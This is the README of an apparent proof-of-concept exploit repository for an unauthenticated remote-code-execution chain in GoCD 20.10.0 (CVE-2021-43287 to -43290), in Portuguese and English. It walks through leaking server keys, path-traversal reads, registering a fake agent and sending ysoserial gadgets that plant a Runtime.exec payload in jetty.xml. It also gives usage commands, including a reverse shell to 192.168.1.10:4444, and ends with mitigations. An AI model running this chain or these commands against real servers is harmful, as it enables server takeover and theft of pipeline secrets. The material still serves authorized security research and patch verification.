# GoCD 20.10.0 — PoC: CVE-2021-43287 · CVE-2021-43288 · CVE-2021-43289 · CVE-2021-43290

> ⚠️ **AVISO LEGAL / LEGAL DISCLAIMER**
>
> **[PT]** Material produzido exclusivamente para fins educacionais e de pesquisa em segurança ofensiva. Utilize somente em ambientes controlados com autorização explícita. O uso indevido é de responsabilidade exclusiva do utilizador.
>
> **[EN]** Produced exclusively for educational and authorized offensive security research purposes. Use only in controlled environments with explicit written permission. Misuse is the sole responsibility of the user.

---

## Índice / Table of Contents

1. [Visão Geral / Overview](#1-visão-geral--overview)
2. [Vulnerabilidades / Vulnerabilities](#2-vulnerabilidades--vulnerabilities)
3. [Encadeamento de Ataque / Attack Chain](#3-encadeamento-de-ataque--attack-chain)
4. [Pré-requisitos / Prerequisites](#4-pré-requisitos--prerequisites)
5. [Ambiente PoC com Docker / PoC Docker Environment](#5-ambiente-poc-com-docker--poc-docker-environment)
6. [Uso dos Scripts / Script Usage](#6-uso-dos-scripts--script-usage)
   - [gocd_rce_noauth.py — RCE sem autenticação / Unauthenticated RCE](#gocd_rce_noauthpy--rce-sem-autenticação--unauthenticated-rce)
   - [gocd_urldns.py — URLDNS / Detecção de desserialização](#gocd_urldnspy--urldns--detecção-de-desserialização)
7. [Referências / References](#7-referências--references)
8. [Cronologia / Timeline](#8-cronologia--timeline)
9. [Mitigação / Mitigation](#9-mitigação--mitigation)

---

## 1. Visão Geral / Overview

**[PT]** O **GoCD** é uma plataforma de CI/CD mantida pela ThoughtWorks. Nas versões anteriores à **21.3.0**, pesquisadores da SonarSource identificaram uma cadeia de vulnerabilidades explorável **sem nenhuma autenticação**. Os dois scripts deste repositório demonstram:

- **`gocd_rce_noauth.py`** — exploração completa da cadeia até **RCE** (Execução Remota de Código), sem credenciais.
- **`gocd_urldns.py`** — detecção **out-of-band** da desserialização Java via gadget chain `URLDNS` e callback DNS (requer credenciais válidas para listar agents registrados).

**[EN]** **GoCD** is a CI/CD platform maintained by ThoughtWorks. In versions prior to **21.3.0**, SonarSource researchers identified a vulnerability chain exploitable **with zero authentication**. The two scripts in this repository demonstrate:

- **`gocd_rce_noauth.py`** — full chain exploitation up to **RCE** (Remote Code Execution), without credentials.
- **`gocd_urldns.py`** — **out-of-band** detection of Java deserialization via the `URLDNS` gadget chain and a DNS callback (requires valid credentials to list registered agents).

---

## 2. Vulnerabilidades / Vulnerabilities

| CVE | Tipo / Type | CVSS 3.1 | CWE | Auth |
|-----|-------------|:---:|-----|:---:|
| **CVE-2021-43287** | Information Disclosure | **7.5 HIGH** | CWE-200 | ❌ Nenhuma / None |
| **CVE-2021-43288** | Stored XSS | **6.1 MEDIUM** | CWE-79 | Agent |
| **CVE-2021-43289** | Path Traversal — PUT | **8.1 HIGH** | CWE-22 | Agent |
| **CVE-2021-43290** | Path Traversal — GET | **8.1 HIGH** | CWE-22 | Agent |

### CVE-2021-43287 — Business Continuity: vazamento sem autenticação / unauthenticated leak

**[PT]** O endpoint `/go/add-on/business-continuity/api/cruise_config` devolve o XML completo de configuração do servidor **sem exigir autenticação**. O XML contém os atributos do elemento `<server>`, incluindo `agentAutoRegisterKey` e `tokenGenerationKey` — as duas chaves necessárias para registrar agentes e assinar requisições autenticadas. Adicionalmente, o parâmetro `pluginName` do endpoint de plugins aceita sequências de path traversal (`../../../../../../`), permitindo leitura de arquivos arbitrários do sistema — como `/proc/self/environ` e `/etc/go/jetty.xml`.

**[EN]** The `/go/add-on/business-continuity/api/cruise_config` endpoint returns the full server configuration XML **without requiring authentication**. The XML contains the `<server>` element attributes, including `agentAutoRegisterKey` and `tokenGenerationKey` — the two keys needed to register agents and sign authenticated requests. Additionally, the `pluginName` parameter of the plugin endpoint accepts path traversal sequences (`../../../../../../`), allowing arbitrary file reads — such as `/proc/self/environ` and `/etc/go/jetty.xml`.

**Endpoints explorados pelos scripts / Endpoints used by the scripts:**
```
GET /go/add-on/business-continuity/api/cruise_config
GET /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../proc/self/environ
GET /go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../etc/go/jetty.xml
```

### CVE-2021-43289 / CVE-2021-43290 — Desserialização Java via `remoteBuildRepository`

**[PT]** O endpoint `/go/remoting/remoteBuildRepository` aceita objetos Java serializados (`Content-Type: application/x-java-serialized-object`) autenticados apenas com o header `Authorization: base64(HMAC-SHA256(tokenGenerationKey, agent_uuid))`. Como o `tokenGenerationKey` é obtido via CVE-2021-43287, um atacante sem credenciais pode enviar gadget chains maliciosas. Os scripts utilizam dois gadgets customizados do ysoserial baseados em **AspectJWeaver**:

- **`AspectJWeaverFileUpload1`** — escreve arquivo arbitrário no sistema de arquivos do servidor (usado para sobrescrever `/etc/go/jetty.xml` com uma versão maliciosa).
- **`AspectJWeaverFileRead1`** — lê `/dev/random`, forçando o Jetty a reinicializar e carregar o `jetty.xml` modificado, disparando a execução do comando injetado via `java.lang.Runtime.exec()`.

**[EN]** The `/go/remoting/remoteBuildRepository` endpoint accepts Java serialized objects (`Content-Type: application/x-java-serialized-object`) authenticated only with the header `Authorization: base64(HMAC-SHA256(tokenGenerationKey, agent_uuid))`. Since `tokenGenerationKey` is obtained via CVE-2021-43287, an unauthenticated attacker can send malicious gadget chains. The scripts use two custom ysoserial gadgets based on **AspectJWeaver**:

- **`AspectJWeaverFileUpload1`** — writes an arbitrary file on the server's filesystem (used to overwrite `/etc/go/jetty.xml` with a malicious version).
- **`AspectJWeaverFileRead1`** — reads `/dev/random`, forcing Jetty to restart and load the modified `jetty.xml`, triggering the command injected via `java.lang.Runtime.exec()`.

---

## 3. Encadeamento de Ataque / Attack Chain

### `gocd_rce_noauth.py` — Cadeia completa sem autenticação / Full unauthenticated chain

```
ATACANTE (sem credenciais) / ATTACKER (no credentials)
│
│ [Step 1] GET /go/add-on/business-continuity/api/cruise_config        (CVE-2021-43287)
│           └─► Extrai agentAutoRegisterKey + tokenGenerationKey do XML
│
│ [Step 3] GET /go/add-on/business-continuity/api/plugin               (Path Traversal)
│           ?folderName=&pluginName=../../../../../../proc/self/environ
│           └─► Lê variáveis de ambiente do processo GoCD
│
│ [Step 4] GET /go/add-on/business-continuity/api/plugin               (Path Traversal)
│           ?folderName=&pluginName=../../../../../../etc/go/jetty.xml
│           └─► Lê jetty.xml → salva como bkp_orig_jetty.xml
│
│ [Step 6] Localmente: injeta payload em jetty.xml
│           └─► Adiciona <Call class="java.lang.Runtime" name="getRuntime">
│                           <Call name="exec"><Arg>{comando}</Arg></Call>
│                         </Call>
│               antes de </Configure> → gera exploit_jetty.xml
│
│ [Step 7] GET /go/admin/agent/token?uuid={novo_uuid}
│           POST /go/admin/agent  (com agentAutoRegisterKey extraída)
│           └─► Registra agente falso chamado "gocd_rce_noauth"
│
│ [Step 8] ysoserial AspectJWeaverFileUpload1  → serializa upload do exploit_jetty.xml → /etc/go/jetty.xml
│          ysoserial AspectJWeaverFileRead1    → serializa leitura de /dev/random (trigger de restart)
│
│ [Step 9] POST /go/remoting/remoteBuildRepository  (Authorization: base64(HMAC-SHA256))
│           └─► Envia AspectJWeaverFileUpload1 → sobrescreve /etc/go/jetty.xml
│           └─► Envia AspectJWeaverFileRead1   → força reinicialização do Jetty
│
▼
Jetty reinicia → carrega jetty.xml malicioso → Runtime.exec({comando}) → RCE
```

### `gocd_urldns.py` — Detecção out-of-band / Out-of-band detection

```
ATACANTE (com credenciais) / ATTACKER (with credentials)
│
│ [Step 1]  POST /go/auth/security_check  (j_username + j_password)
│            └─► Obtém JSESSIONID
│
│ [Step 2]  GET /go/add-on/business-continuity/api/cruise_config
│            └─► Extrai tokenGenerationKey
│
│ [Step 4]  GET plugin?pluginName=../../../../../../proc/self/environ
│            └─► Lê variáveis de ambiente
│
│ [Step 5]  GET /go/api/agents  (Accept: application/vnd.go.cd+json)
│            └─► Lista agents; seleciona o primeiro com agent_state != "Building"
│                e extrai seu UUID
│
│ [Step 9]  ysoserial URLDNS {interact_url}
│            └─► Serializa gadget URLDNS apontando para servidor de interação DNS
│
│ [Step 10] POST /go/remoting/remoteBuildRepository
│            └─► Envia payload URLDNS com UUID + Authorization HMAC
│
▼
Servidor GoCD desserializa → faz requisição DNS para {interact_url}
DNS callback confirma vulnerabilidade de desserialização
```

---

## 4. Pré-requisitos / Prerequisites

### Dependências Python / Python dependencies

```bash
pip install requests
```

### Ferramentas externas obrigatórias / Mandatory external tools

Ambos os scripts dependem de um JDK 32-bit e do `ysoserial.jar` no diretório de execução.
Both scripts depend on a 32-bit JDK and `ysoserial.jar` in the working directory.

| Ferramenta / Tool | Versão / Version | Finalidade / Purpose |
|---|---|---|
| **ysoserial.jar** | Custom (com gadgets AspectJWeaver) | Geração de payloads serializados |
| **OpenLogic OpenJDK** | `8u332-b09` **x32** | Runtime para ysoserial |

**Estrutura esperada de arquivos / Expected file structure:**
```
diretório de execução / working directory
├── gocd_rce_noauth.py
├── gocd_urldns.py
├── ysoserial.jar
└── openlogic-openjdk-8u332-b09-linux-x32/
    └── bin/
        └── java
```

> **[PT]** O script detecta o sistema operacional automaticamente e usa o caminho correspondente:
> - Linux: `./openlogic-openjdk-8u332-b09-linux-x32/bin/java`
> - Windows: `.\openlogic-openjdk-8u332-b09-windows-32\bin\java`
>
> **[EN]** The script auto-detects the OS and uses the matching path:
> - Linux: `./openlogic-openjdk-8u332-b09-linux-x32/bin/java`
> - Windows: `.\openlogic-openjdk-8u332-b09-windows-32\bin\java`

### Para `gocd_urldns.py`: serviço de interação DNS / DNS interaction service

**[PT]** É necessário um servidor de interação DNS que registre callbacks (ex.: [interactsh](https://github.com/projectdiscovery/interactsh) ou Burp Collaborator). O script envia a URL recebida em `-i` como argumento para o gadget `URLDNS`.

**[EN]** A DNS interaction server that registers callbacks is required (e.g., [interactsh](https://github.com/projectdiscovery/interactsh) or Burp Collaborator). The script passes the URL received via `-i` as the argument to the `URLDNS` gadget.

```bash
# Iniciar listener interactsh / Start interactsh listener
interactsh-client
# Copiar a URL gerada (ex: abcdef.oast.pro) e usar como valor de -i
# Copy the generated URL (e.g. abcdef.oast.pro) and use as -i value
```

---

## 5. Ambiente PoC com Docker / PoC Docker Environment

### Iniciar o alvo vulnerável / Start the vulnerable target

```bash
# Clonar / Clone
git clone https://github.com/<usuario>/gocd-cve-poc.git
cd gocd-cve-poc

# Subir apenas o servidor GoCD 20.10.0
# Start only the GoCD 20.10.0 server
docker-compose up -d gocd-server

# Aguardar inicialização (~90s) / Wait for startup (~90s)
docker-compose logs -f gocd-server
# Pronto quando aparecer: "Go server port: 8153"
```

| Container | Imagem / Image | Porta / Port |
|---|---|:---:|
| `gocd-server-vuln` | `gocd/gocd-server:v20.10.0` | 8153 (HTTP), 8154 (HTTPS) |
| `gocd-agent-vuln` | `gocd/gocd-agent-alpine-3.12:v20.10.0` | — |

```bash
# Interface web / Web UI
# URL: http://localhost:8153/go

# Confirmar que o endpoint vulnerável responde (HTTP 200 esperado)
# Confirm the vulnerable endpoint responds (HTTP 200 expected)
curl -sk http://localhost:8153/go/add-on/business-continuity/api/cruise_config | head -5
```

### Teardown

```bash
docker-compose down -v
```

---

## 6. Uso dos Scripts / Script Usage

---

### `gocd_rce_noauth.py` — RCE sem autenticação / Unauthenticated RCE

**[PT]** Executa a cadeia completa de exploração sem nenhuma credencial: lê o `cruise_config`, extrai as chaves do servidor, lê e modifica o `jetty.xml` via path traversal, registra um agente falso, serializa os gadgets `AspectJWeaver` com ysoserial e os envia ao endpoint de desserialização para sobrescrever o `jetty.xml` e forçar a reinicialização do Jetty com o comando injetado.

**[EN]** Executes the full exploitation chain with no credentials: reads `cruise_config`, extracts server keys, reads and modifies `jetty.xml` via path traversal, registers a fake agent, serializes the `AspectJWeaver` gadgets with ysoserial, and sends them to the deserialization endpoint to overwrite `jetty.xml` and force Jetty to restart with the injected command.

#### Argumentos / Arguments

| Flag | Obrigatório / Required | Descrição (PT) | Description (EN) |
|------|:---:|---|---|
| `-c` | ✅ | Comando a executar no servidor | Command to execute on the server |
| `-t` | ✅ | URL base do GoCD (ex: `http://gocd.example.com`) | GoCD base URL |

#### Exemplos / Examples

```bash
# Verificar execução com 'id'
# Verify execution with 'id'
python3 gocd_rce_noauth.py \
    -t http://localhost:8153 \
    -c "id"
```

```bash
# Reverse shell (ajustar IP e porta / adjust IP and port)
python3 gocd_rce_noauth.py \
    -t http://localhost:8153 \
    -c "bash -i >& /dev/tcp/192.168.1.10/4444 0>&1"
```

```bash
# Criar arquivo de prova no servidor
# Create proof file on the server
python3 gocd_rce_noauth.py \
    -t http://localhost:8153 \
    -c "touch /tmp/pwned_by_gocd_cve"

# Verificar / Verify
docker exec gocd-server-vuln ls /tmp/pwned_by_gocd_cve
```

#### Saída esperada / Expected output

```
[1] Verificando arquivo cruise_config
Arquivo cruise_config acessível

[2] Lendo atributos do servidor
agentAutoRegisterKey: 3b4c5d6e-...
tokenGenerationKey: 7f8a9b0c-...
artifactsdir: /godata/artifacts
siteUrl: http://localhost:8153/go
...

[3] Verificando arquivo variáveis de ambiente do processo
Arquivo acessível

[4] Verificando arquivo jetty.xml
Arquivo acessível

[5] Criando backup do arquivo jetty.xml
Backup criado

[6] Criando arquivo exploit_jetty.xml
Arquivo criado

[7] Registrando novo agent
Gerando token do agent
Token gerado

Registrando novo agent
Agent registrado
Dados do agent: {'hostname': 'gocd_rce_noauth', 'uuid': 'a1b2c3d4-...', ...}

[8] Serializando objetos
Objetos serializados

[9] Enviando objetos serializados
Enviando exploit_jetty.xml
Arquivo enviado

Enviando comando para forçar reinicialização
Aguardando reinicialização
```

#### Arquivos gerados localmente / Files generated locally

| Arquivo / File | Conteúdo / Content |
|---|---|
| `bkp_orig_jetty.xml` | Cópia original do `/etc/go/jetty.xml` baixado do servidor |
| `exploit_jetty.xml` | Versão modificada com `Runtime.exec({comando})` injetado antes de `</Configure>` |

#### Payload injetado no jetty.xml / Payload injected into jetty.xml

```xml
<Call class="java.lang.Runtime" name="getRuntime">
    <Call name="exec">
        <Arg>{comando}</Arg>
    </Call>
</Call>
</Configure>
```

---

### `gocd_urldns.py` — URLDNS / Detecção de desserialização

**[PT]** Variante de detecção **out-of-band** que confirma a vulnerabilidade de desserialização Java sem executar código destrutivo. Requer credenciais para autenticar e listar os agents registrados, da qual extrai o UUID de um agent com `agent_state != "Building"`. Em seguida serializa o gadget `URLDNS` com o ysoserial apontando para uma URL de interação DNS e o envia ao endpoint `/go/remoting/remoteBuildRepository`. Um callback DNS confirmará que o servidor desserializou o payload.

**[EN]** An **out-of-band** detection variant that confirms the Java deserialization vulnerability without executing destructive code. Requires credentials to authenticate and list registered agents, from which it extracts the UUID of an agent with `agent_state != "Building"`. It then serializes the `URLDNS` gadget with ysoserial pointing to a DNS interaction URL and sends it to the `/go/remoting/remoteBuildRepository` endpoint. A DNS callback will confirm the server deserialized the payload.

#### Argumentos / Arguments

| Flag | Obrigatório / Required | Descrição (PT) | Description (EN) |
|------|:---:|---|---|
| `-u` | ✅ | Usuário GoCD | GoCD username |
| `-p` | ✅ | Senha GoCD | GoCD password |
| `-i` | ✅ | URL de interação DNS (ex: `http://abcdef.oast.pro`) | DNS interaction URL |
| `-t` | ✅ | URL base do GoCD | GoCD base URL |

#### Exemplo / Example

```bash
python3 gocd_urldns.py \
    -t http://localhost:8153 \
    -u admin \
    -p password \
    -i http://abcdef.oast.pro
```

#### Saída esperada / Expected output

```
[1] Autenticando
Autenticado com sucesso

[2] Verificando arquivo cruise_config
Arquivo cruise_config acessível

[3] Lendo atributos do servidor
agentAutoRegisterKey: 3b4c5d6e-...
tokenGenerationKey: 7f8a9b0c-...
...

[4] Verificando arquivo variáveis de ambiente do processo
Arquivo acessível

[5] Listando agents
Lista carregada

Buscando GUID de um agent
Localizado agent com status != Building
GUID: 550e8400-e29b-41d4-a716-446655440000

[9] Serializando objetos
b'\xac\xed\x00\x05...'
Objetos serializados

[10] Enviando objeto serializado
<Response [500]>
...
Objeto URLDNS enviado
```

> **[PT]** Após o envio, verificar no painel do interactsh/Collaborator se houve uma requisição DNS originada do IP do servidor GoCD. Isso confirma a vulnerabilidade de desserialização antes de explorar com o `gocd_rce_noauth.py`.
>
> **[EN]** After sending, check the interactsh/Collaborator dashboard for a DNS request originating from the GoCD server's IP. This confirms the deserialization vulnerability before exploiting with `gocd_rce_noauth.py`.

#### Header de autorização / Authorization header

Ambos os scripts calculam a autorização da mesma forma / Both scripts compute authorization the same way:

```python
Authorization = base64( HMAC-SHA256(key=tokenGenerationKey, msg=agent_uuid) )
```

---

## 7. Referências / References

### CVE — NVD / NIST

| CVE | Link |
|-----|------|
| CVE-2021-43287 | https://nvd.nist.gov/vuln/detail/CVE-2021-43287 |
| CVE-2021-43288 | https://nvd.nist.gov/vuln/detail/CVE-2021-43288 |
| CVE-2021-43289 | https://nvd.nist.gov/vuln/detail/CVE-2021-43289 |
| CVE-2021-43290 | https://nvd.nist.gov/vuln/detail/CVE-2021-43290 |

### Análise técnica / Technical writeups

| Recurso / Resource | URL |
|---|---|
| SonarSource — Agent 007: Pre-Auth Takeover (CVE-2021-43287) | https://blog.sonarsource.com/gocd-pre-auth-pipeline-takeover |
| SonarSource — Agent 008: Chaining Vulnerabilities (CVE-2021-43288/89/90) | https://blog.sonarsource.com/gocd-vulnerability-chain |
| AttackerKB — CVE-2021-43287 | https://attackerkb.com/assessments/9101a539-4c6e-4638-a2ec-12080b7e3b50 |

### Commits de correção / Fix commits

| CVE | Commit | Mudança / Change |
|-----|--------|-----------------|
| CVE-2021-43287 | [`41abc21`](https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c) | Auth check no `DashBoardController.java` |
| CVE-2021-43288 | [`f5c1d2a`](https://github.com/gocd/gocd/commit/f5c1d2aa9ab302a97898a6e4b16218e64fe8e9e4) | `StringEscapeUtils.escapeHtml4()` em nomes de artefatos |
| CVE-2021-43289 | [`c22e042`](https://github.com/gocd/gocd/commit/c22e0428164af25d3e91baabd3f538a41cadc82f) | `isValidStageCounter()` no handler PUT |
| CVE-2021-43290 | [`4c4bb47`](https://github.com/gocd/gocd/commit/4c4bb4780eb0d3fc4cacfc4cfcc0b07e2eaf0595) | `isValidStageCounter()` no handler GET |

### Release notes / Versão corrigida

- GoCD v21.3.0: https://www.gocd.org/releases/#21-3-0

---

## 8. Cronologia / Timeline

| Data / Date | Evento / Event |
|-------------|----------------|
| 2021-10-18 – 2021-10-21 | SonarSource reporta as vulnerabilidades ao GoCD via HackerOne |
| 2021-10-23 | GoCD publica os patches no GitHub |
| 2021-10-26 | GoCD lança a versão v21.3.0 com todas as correções |
| 2021-11-04 | CVEs -43288, -43289, -43290 atribuídos |
| 2022-04-14 | CVE-2021-43287 publicado no NVD |

---

## 9. Mitigação / Mitigation

**[PT]**
1. **Atualize** o GoCD para a versão **≥ 21.3.0** imediatamente.
2. Se o add-on de Business Continuity não for utilizado, **desative-o**.
3. **Rotacione** o `tokenGenerationKey`, `agentAutoRegisterKey` e todas as credenciais de pipelines expostas.
4. **Revise os logs** em busca de requisições não autenticadas a `/go/add-on/business-continuity/` e posts para `/go/remoting/remoteBuildRepository` com `Content-Type: application/x-java-serialized-object`.
5. Aplique **segmentação de rede** para restringir acesso ao servidor GoCD a hosts autorizados.

**[EN]**
1. **Upgrade** GoCD to version **≥ 21.3.0** immediately.
2. If the Business Continuity add-on is not needed, **disable it**.
3. **Rotate** `tokenGenerationKey`, `agentAutoRegisterKey`, and all pipeline credentials that may have been exposed.
4. **Review logs** for unauthenticated requests to `/go/add-on/business-continuity/` and POST requests to `/go/remoting/remoteBuildRepository` with `Content-Type: application/x-java-serialized-object`.
5. Apply **network segmentation** to restrict GoCD server access to authorized hosts only.

---

*Para fins educacionais. / For educational purposes only.*
